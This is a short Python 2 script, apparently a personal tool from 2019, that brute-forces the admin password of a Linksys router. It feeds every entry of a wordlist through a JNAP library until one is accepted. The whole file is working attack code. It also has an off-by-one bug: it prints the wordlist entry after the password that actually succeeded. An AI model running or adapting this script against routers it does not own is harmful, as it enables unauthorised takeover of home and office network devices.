# simple-crack.py - simple cracking method for linksys routers using JNAP library
# May 4th 2019
# info@tpidg.us

from jnap.router import Linksys 
from time import sleep
import json
import sys
import getpass

addr = sys.argv[1]
dict = sys.argv[2]
router = Linksys(addr)

passwords = [line.rstrip('\n') for line in open(dict)]
count = 0

router.password(passwords[count])
checked_pass = router.check_password(passwords[count]).content
print str(count) + " " + str(passwords[count])
count += 1

while "Invalid" in checked_pass:
	router.password(passwords[count])
	checked_pass = router.check_password(passwords[count]).content
	print str(count) + " " + str(passwords[count])
	count += 1

print "Success!!" + str(passwords[count])
